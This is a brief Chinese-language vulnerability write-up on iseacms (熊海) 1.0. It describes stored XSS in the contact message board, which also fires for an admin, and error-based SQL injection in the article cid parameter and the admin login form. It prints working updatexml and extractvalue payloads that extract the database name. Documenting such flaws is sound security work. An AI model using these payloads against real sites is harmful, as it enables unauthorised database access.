### iseacms（熊海）

```
版本信息：1.0
```

#### 前台留言XSS

在【联系】下方的留言处插入payload

![Snipaste_2022-10-12_10-43-55](images/Snipaste_2022-10-12_10-43-55.jpg)前台触发



![Snipaste_2022-10-12_10-45-13](images/Snipaste_2022-10-12_10-45-13.jpg)



后台管理员查看留言也会触发



![Snipaste_2022-10-12_10-46-06](images/Snipaste_2022-10-12_10-46-06.jpg)



#### 文章处SQL注入

随意点开一篇文章

![Snipaste_2022-10-12_11-01-21](images/Snipaste_2022-10-12_11-01-21.jpg)

在cid处存在漏洞

![Snipaste_2022-10-12_11-02-10](images/Snipaste_2022-10-12_11-02-10.jpg)



使用报错注入获取数据库名

```
and(updatexml(1,concat(0x7e,(select%20database()),0x7e),1))
```

![Snipaste_2022-10-12_11-03-41](images/Snipaste_2022-10-12_11-03-41.jpg)



#### 后台登录处SQL注入

输入1'即可引起报错

![Snipaste_2022-10-12_10-54-18](images/Snipaste_2022-10-12_10-54-18.jpg)



```
1' and (extractvalue(1,concat(0x7e,(select database()),0x7e))) #
```

![Snipaste_2022-10-12_10-52-55](images/Snipaste_2022-10-12_10-52-55.jpg)



![Snipaste_2022-10-12_10-53-06](images/Snipaste_2022-10-12_10-53-06.jpg)

